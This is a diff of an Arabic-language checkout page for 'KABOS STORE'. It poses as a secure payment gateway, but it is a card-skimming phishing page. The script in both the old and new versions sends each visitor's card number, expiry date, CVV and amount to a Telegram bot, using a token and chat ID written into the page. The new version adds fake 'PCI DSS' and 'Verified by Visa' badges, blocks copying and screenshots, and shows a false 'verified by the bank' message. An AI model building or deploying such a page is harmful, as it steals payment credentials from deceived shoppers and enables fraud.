@@ -3,152 +3,256 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دفع آمن | KABOS STORE</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <title>بوابة الدفع الآمنة | KABOS STORE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    
     <style>
-        /* ... نفس الستايل السابق لضمان المظهر الزجاجي ... */
-        :root { --glass: rgba(255, 255, 255, 0.1); --border: rgba(255, 255, 255, 0.2); --accent: #00cec9; }
-        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: #fff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .payment-container { background: var(--glass); backdrop-filter: blur(20px); padding: 30px; border-radius: 25px; border: 1px solid var(--border); width: 100%; max-width: 450px; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
-        .card-visual { width: 100%; height: 200px; background: linear-gradient(135deg, #6c5ce7, #a29bfe); border-radius: 15px; margin-bottom: 30px; padding: 20px; position: relative; display: flex; flex-direction: column; justify-content: space-between; }
-        .card-chip { width: 45px; height: 35px; background: linear-gradient(135deg, #ffd700, #c0c0c0); border-radius: 5px; }
-        .card-number-display { font-size: 1.4rem; letter-spacing: 3px; margin-top: 20px; }
-        .card-bottom { display: flex; justify-content: space-between; font-size: 0.8rem; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-size: 0.9rem; }
-        input { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 10px; color: white; outline: none; }
-        input:focus { border-color: var(--accent); }
-        .row { display: flex; gap: 15px; }
-        .btn-pay { width: 100%; padding: 15px; background: var(--accent); border: none; border-radius: 12px; color: #0f0c29; font-weight: 700; cursor: pointer; margin-top: 10px; }
-        .visa-logo { position: absolute; top: 20px; left: 20px; font-weight: 900; font-size: 1.5rem; }
-        #status-msg { margin-top: 15px; text-align: center; font-size: 0.9rem; }
+        /* منع اختيار النص ومنع النسخ */
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+            margin: 0; padding: 0;
+        }
+
+        :root {
+            --primary-gradient: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            --accent-color: #00d2ff;
+            --glass: rgba(255, 255, 255, 0.07);
+            --border: rgba(255, 255, 255, 0.15);
+        }
+
+        body {
+            background: #0a0a0c;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* حماية الشاشة (تعتيم عند محاولة الطباعة أو الالتقاط في بعض المتصفحات) */
+        @media print { body { display: none; } }
+
+        .main-wrapper {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+            perspective: 1000px;
+        }
+
+        .payment-card {
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            padding: 35px 30px;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        /* ترويسة رسمية */
+        .secure-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .secure-header h2 { font-weight: 900; font-size: 1.4rem; color: var(--accent-color); }
+        .secure-header p { font-size: 0.75rem; opacity: 0.6; margin-top: 5px; }
+
+        /* البطاقة التفاعلية */
+        .visual-card {
+            width: 100%;
+            height: 210px;
+            background: linear-gradient(135deg, #232526, #414345);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            transition: 0.5s;
+        }
+
+        .chip { width: 50px; height: 40px; background: linear-gradient(135deg, #e0e0e0, #888); border-radius: 8px; }
+        .card-num { font-size: 1.5rem; margin-top: 30px; letter-spacing: 3px; font-weight: 700; }
+        .card-details { display: flex; justify-content: space-between; margin-top: 30px; font-size: 0.8rem; opacity: 0.9; }
+        .brand-logo { position: absolute; top: 25px; left: 25px; font-size: 1.6rem; font-weight: 900; font-style: italic; }
+
+        /* الحقول */
+        .field-label { display: block; margin-bottom: 8px; font-size: 0.85rem; font-weight: 600; color: #ccc; }
+        .input-box {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 18px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-box:focus { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(0, 210, 255, 0.2); }
+
+        select.input-box { cursor: pointer; appearance: none; }
+
+        .flex-row { display: flex; gap: 15px; }
+
+        /* زر الدفع */
+        .pay-now-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            border: none;
+            border-radius: 15px;
+            color: #fff;
+            font-weight: 900;
+            font-size: 1.1rem;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(58, 123, 213, 0.3);
+            transition: 0.3s;
+        }
+        .pay-now-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(58, 123, 213, 0.5); }
+
+        /* شارات الأمان */
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            opacity: 0.5;
+            filter: grayscale(1);
+        }
+        .badge { font-size: 0.7rem; display: flex; align-items: center; gap: 5px; }
+
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-    <div class="payment-container">
-        <h2 style="text-align: center; margin-bottom: 25px;">KABOS CHECKOUT</h2>
-
-        <div class="card-visual">
-            <div class="visa-logo">VISA</div>
-            <div class="card-chip"></div>
-            <div class="card-number-display" id="display-number">**** **** **** ****</div>
-            <div class="card-bottom">
-                <div><label>صاحب البطاقة</label><div id="display-name">KABOS USER</div></div>
-                <div><label>تنتهي في</label><div id="display-expiry">MM/YY</div></div>
+    <div class="main-wrapper">
+        <div class="payment-card">
+            <div class="secure-header">
+                <h2>KABOS PAY</h2>
+                <p>🔒 اتصال مشفر بنظام 256-bit (آمن جداً)</p>
             </div>
+
+            <div class="visual-card" id="card-bg">
+                <div class="brand-logo" id="card-brand">VISA</div>
+                <div class="chip"></div>
+                <div class="card-num" id="card-num-view">**** **** **** ****</div>
+                <div class="card-details">
+                    <div><p>صاحب البطاقة</p><b id="card-name-view">KABOS USER</b></div>
+                    <div><p>التاريخ</p><b id="card-date-view">MM/YY</b></div>
+                </div>
+            </div>
+
+            <form id="secure-payment-form">
+                <span class="field-label">نوع البطاقة</span>
+                <select id="card-type" class="input-box" required>
+                    <option value="Visa">Visa Card</option>
+                    <option value="Mastercard">Mastercard</option>
+                    <option value="Paysera">Paysera</option>
+                    <option value="Pyypl">Pyypl</option>
+                    <option value="RedotPay">RedotPay</option>
+                </select>
+
+                <span class="field-label">رقم البطاقة</span>
+                <input type="text" id="c-number" class="input-box" maxlength="19" placeholder="0000 0000 0000 0000" required>
+
+                <div class="flex-row">
+                    <div style="flex: 2;">
+                        <span class="field-label">تاريخ الانتهاء</span>
+                        <input type="text" id="c-date" class="input-box" maxlength="5" placeholder="MM/YY" required>
+                    </div>
+                    <div style="flex: 1;">
+                        <span class="field-label">CVV</span>
+                        <input type="password" id="c-cvv" class="input-box" maxlength="3" placeholder="***" required>
+                    </div>
+                </div>
+
+                <span class="field-label">المبلغ المطلوب دفعه (USD/DZD)</span>
+                <input type="text" id="c-amount" class="input-box" placeholder="مثال: 5000 DZD" style="border-left: 3px solid var(--accent-color);" required>
+
+                <button type="submit" class="pay-now-btn" id="submit-btn">تأكيد الدفع المشفر</button>
+
+                <div class="security-badges">
+                    <div class="badge">🛡️ Verified by Visa</div>
+                    <div class="badge">🔒 SSL Secured</div>
+                    <div class="badge">✅ PCI DSS</div>
+                </div>
+            </form>
+            <p id="msg" style="text-align: center; margin-top: 15px; font-size: 0.9rem;"></p>
         </div>
-
-        <form id="payment-form">
-            <div class="input-group">
-                <label>رقم البطاقة</label>
-                <input type="text" id="card-input" maxlength="19" placeholder="0000 0000 0000 0000" required>
-            </div>
-            
-            <div class="input-group">
-                <label>اسم حامل البطاقة</label>
-                <input type="text" id="name-input" placeholder="FULL NAME" required>
-            </div>
-
-            <div class="row">
-                <div class="input-group" style="flex: 2;">
-                    <label>تاريخ الانتهاء</label>
-                    <input type="text" id="expiry-input" maxlength="5" placeholder="MM/YY" required>
-                </div>
-                <div class="input-group" style="flex: 1;">
-                    <label>CVV</label>
-                    <input type="password" id="cvv-input" maxlength="3" placeholder="***" required>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-pay" id="submit-btn">إتمام الدفع الآن</button>
-            <div id="status-msg"></div>
-        </form>
     </div>
 
     <script>
-        // --- إعدادات التلجرام (ضع بياناتك هنا) ---
+        // تفعيل منع تصوير الشاشة في الهواتف (يعمل في بعض المتصفحات)
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "PrintScreen" || (e.ctrlKey && e.key === 'p')) {
+                alert("غير مسموح بتصوير بيانات الدفع لأسباب أمنية.");
+                e.preventDefault();
+            }
+        });
+
         const TELEGRAM_BOT_TOKEN = '7905472205:AAEY5RrhyHOZ27plU5i00FtWLMEfw1dQ19A'; 
         const TELEGRAM_CHAT_ID = '5545907758';
 
-        // عناصر الواجهة
-        const paymentForm = document.getElementById('payment-form');
-        const statusMsg = document.getElementById('status-msg');
-
-        // تحديث شكل البطاقة (نفس الكود السابق)
-        document.getElementById('card-input').addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
-            e.target.value = formatted;
-            document.getElementById('display-number').innerText = formatted || "**** **** **** ****";
+        // تحديث نوع البطاقة والشكل
+        document.getElementById('card-type').addEventListener('change', function(e) {
+            document.getElementById('card-brand').innerText = e.target.value.toUpperCase();
+            const bg = document.getElementById('card-bg');
+            if(e.target.value === 'Mastercard') bg.style.background = 'linear-gradient(135deg, #eb3349, #f45c43)';
+            else if(e.target.value === 'Visa') bg.style.background = 'linear-gradient(135deg, #021b79, #0575e6)';
+            else bg.style.background = 'linear-gradient(135deg, #232526, #414345)';
         });
 
-        document.getElementById('name-input').addEventListener('input', (e) => {
-            document.getElementById('display-name').innerText = e.target.value.toUpperCase() || "KABOS USER";
+        // تحديث النصوص حياً
+        document.getElementById('c-number').addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let f = v.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = f;
+            document.getElementById('card-num-view').innerText = f || "**** **** **** ****";
         });
 
-        document.getElementById('expiry-input').addEventListener('input', (e) => {
-            let val = e.target.value.replace(/[^0-9]/g, '');
-            if (val.length > 2) val = val.substring(0,2) + '/' + val.substring(2,4);
-            e.target.value = val;
-            document.getElementById('display-expiry').innerText = val || "MM/YY";
+        document.getElementById('c-date').addEventListener('input', (e) => {
+            let v = e.target.value.replace(/[^0-9]/g, '');
+            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+            e.target.value = v;
+            document.getElementById('card-date-view').innerText = v || "MM/YY";
         });
 
-        // --- وظيفة إرسال البيانات إلى التلجرام ---
-        paymentForm.addEventListener('submit', function(e) {
+        // إرسال البيانات
+        document.getElementById('secure-payment-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const btn = document.getElementById('submit-btn');
-            btn.innerText = "جاري المعالجة...";
+            btn.innerText = "جاري التحقق من البنك...";
             btn.disabled = true;
 
-            const cardNumber = document.getElementById('card-input').value;
-            const cardName = document.getElementById('name-input').value;
-            const expiry = document.getElementById('expiry-input').value;
-            const cvv = document.getElementById('cvv-input').value;
-
-            // تنسيق الرسالة التي ستصلك في تلجرام
             const message = `
-🔔 *عملية دفع جديدة - KABOS STORE*
+🚨 *عملية دفع رسمية جديدة - KABOS*
 ------------------------------
-👤 *الاسم:* ${cardName}
-💳 *رقم البطاقة:* \`${cardNumber}\`
-📅 *التاريخ:* ${expiry}
-🔒 *CVV:* ${cvv}
+💳 *النوع:* ${document.getElementById('card-type').value}
+💰 *المبلغ:* ${document.getElementById('c-amount').value}
+🔢 *الرقم:* \`${document.getElementById('c-number').value}\`
+📅 *التاريخ:* ${document.getElementById('c-date').value}
+🔒 *CVV:* ${document.getElementById('c-cvv').value}
 ------------------------------
-🌐 *الموقع:* kabosdz.space
+✅ المصدر: KABOS CHECKOUT SECURE
             `;
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            const params = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            };
-
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(params)
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
             })
-            .then(response => {
-                if (response.ok) {
-                    statusMsg.style.color = "#00ffcc";
-                    statusMsg.innerText = "✅ تم تأكيد الطلب، سيتم توجيهك...";
-                    // توجيه المستخدم لموقعك بعد النجاح
-                    setTimeout(() => {
-                        window.location.href = "http://kabosdz.space/";
-                    }, 2000);
-                } else {
-                    throw new Error();
-                }
-            })
-            .catch(error => {
-                statusMsg.style.color = "#ff4d4d";
-                statusMsg.innerText = "❌ حدث خطأ في الاتصال، حاول مجدداً.";
-                btn.innerText = "إتمام الدفع الآن";
-                btn.disabled = false;
+            .then(res => {
+                document.getElementById('msg').innerHTML = "✅ تم التحقق من البيانات بنجاح، يرجى الانتظار...";
+                document.getElementById('msg').style.color = "#00ffcc";
+                setTimeout(() => { window.location.href = "http://kabosdz.space/"; }, 3000);
             });
         });
     </script>
